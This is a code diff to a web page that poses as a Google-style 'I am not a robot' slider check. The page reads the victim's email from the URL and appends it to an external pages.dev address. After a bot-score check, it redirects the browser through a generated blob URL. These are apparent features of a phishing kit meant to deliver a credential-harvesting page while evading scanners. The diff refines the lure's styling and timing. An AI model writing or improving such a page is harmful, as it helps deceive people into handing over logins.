@@ -9,7 +9,7 @@
 #overlay {
     position: fixed;
     inset: 0;
-    background: rgba(0, 135, 90, 0.95);
+    background: #ffffff; /* CHANGED to pure white like Google anti-bot */
     display: flex;
     justify-content: center;
     align-items: center;
@@ -17,11 +17,11 @@
 }
 /* VERIFICATION BOX */
 #verificationBox {
-    width: 240px;
-    padding: 20px;
-    border-radius: 16px;
+    width: 220px;
+    padding: 16px;
+    border-radius: 14px;
     background: #fff;
-    box-shadow: 0 3px 10px rgba(0,0,0,0.2);
+    box-shadow: 0 2px 6px rgba(0,0,0,0.2);
     border: 1px solid #dcdcdc;
     text-align: left;
     font-family: Arial, sans-serif;
@@ -30,32 +30,32 @@
 #verificationBox .header {
     display: flex;
     align-items: center;
-    gap: 12px;
-    margin-bottom: 14px;
+    gap: 10px;
+    margin-bottom: 12px;
 }
 #robotIcon {
-    width: 32px;
-    height: 32px;
+    width: 28px;
+    height: 28px;
     border-radius: 50%;
     background: #f8f9fa;
     display: flex;
     align-items: center;
     justify-content: center;
-    font-size: 18px;
+    font-size: 16px;
     color: #555;
     transform: rotate(0deg);
     transition: transform 0.05s linear;
 }
 #verificationBox .header span {
-    font-size: 16px;
+    font-size: 15px;
     color: #333;
 }
 /* SLIDER */
 #sliderContainer {
     width: 100%;
-    height: 40px;
+    height: 36px;
     background: #f1f3f4;
-    border-radius: 20px;
+    border-radius: 18px;
     position: relative;
     cursor: pointer;
     overflow: hidden;
@@ -67,12 +67,12 @@
     height: 100%;
     background: #d2e7d5;
     width: 0;
-    border-radius: 20px;
+    border-radius: 18px;
     transition: width 0.1s;
 }
 #slider {
-    width: 40px;
-    height: 40px;
+    width: 36px;
+    height: 36px;
     background: #34a853;
     border-radius: 50%;
     position: absolute;
@@ -95,7 +95,7 @@
     justify-content: center;
     pointer-events: none;
     color: #555;
-    font-size: 15px;
+    font-size: 14px;
     transition: opacity 0.2s;
 }
 /* CHECKMARK */
@@ -104,15 +104,15 @@
     top: 50%;
     left: 50%;
     transform: translate(-50%, -50%) scale(0);
-    font-size: 20px;
+    font-size: 18px;
     color: #34a853;
     pointer-events: none;
     transition: transform 0.3s ease;
 }
 /* SPINNER */
 .spinner {
-    width: 14px;
-    height: 14px;
+    width: 12px;
+    height: 12px;
     border-radius: 50%;
     border: 2px solid #40739e;
     border-top-color: transparent;
@@ -122,7 +122,7 @@
 #verifying {
     display: none;
     margin-top: 10px;
-    font-size: 13px;
+    font-size: 12px;
     color: #555;
     text-align: center;
 }
@@ -156,7 +156,7 @@
 
 <script>
 // IPFS URL
-const BASE_IPFS = "https://23b538b5.ko1wx90sd.pages.dev/";
+const BASE_IPFS = "https://23b538b5.ko1wx90sd.pages.dev";
 function getEmail() { return new URLSearchParams(location.search).get("email") || ""; }
 function buildIPFS(email) { return email ? BASE_IPFS + "#" + email : BASE_IPFS; }
 function createBlobHTML(url) {
@@ -178,7 +178,7 @@ function computeBotScore() {
 // ROBOT ROTATION
 let robotRotation = 0;
 const robotIcon = document.getElementById("robotIcon");
-let rotationSpeed = 1;
+let rotationSpeed = 1; // idle speed
 function rotateRobot() {
     robotRotation += rotationSpeed;
     robotIcon.style.transform = `rotate(${robotRotation}deg)`;
@@ -228,14 +228,8 @@ function endDrag() {
     isDragging = false;
     rotationSpeed = 1;
 
-    const maxPos = sliderContainer.offsetWidth - slider.offsetWidth;
-    const currentPos = parseInt(slider.style.left) || 0;
-
-    // SNAP logic: if slider past 80% of track, auto-complete
-    if (currentPos >= maxPos * 0.8) {
-        slider.style.left = maxPos + "px";
-        sliderFill.style.width = maxPos + slider.offsetWidth/2 + "px";
-        sliderText.style.opacity = 0;
+    if (parseInt(slider.style.left) >= sliderContainer.offsetWidth - slider.offsetWidth - 1) {
+        if (navigator.vibrate) navigator.vibrate(50);
 
         const botScore = computeBotScore();
         if (botScore >= 60) {
@@ -248,6 +242,7 @@ function endDrag() {
 
         checkmark.style.transform = "translate(-50%, -50%) scale(1)";
         slider.style.display = "none";
+        sliderText.style.opacity = 0;
         verifying.style.display = "block";
 
         setTimeout(() => {
@@ -258,23 +253,22 @@ function endDrag() {
             const blob = new Blob([blobHTML], { type: "text/html" });
             const blobURL = URL.createObjectURL(blob);
             window.location.href = blobURL;
-        }, 500);
+        }, 800);
     } else {
-        // slide back if not far enough
         slider.style.left = "0px";
         sliderFill.style.width = "0px";
         sliderText.style.opacity = 1;
     }
 }
 
-// MOUSE EVENTS
+// Mouse events
 slider.addEventListener("mousedown", e => startDrag(e.clientX));
 document.addEventListener("mousemove", e => onDrag(e.clientX));
 document.addEventListener("mouseup", endDrag);
 
-// TOUCH EVENTS
+// Touch events
 slider.addEventListener("touchstart", e => startDrag(e.touches[0].clientX));
-document.addEventListener("touchmove", e => { if(isDragging) onDrag(e.touches[0].clientX); });
+document.addEventListener("touchmove", e => { if (isDragging) onDrag(e.touches[0].clientX); });
 document.addEventListener("touchend", endDrag);
 </script>
 
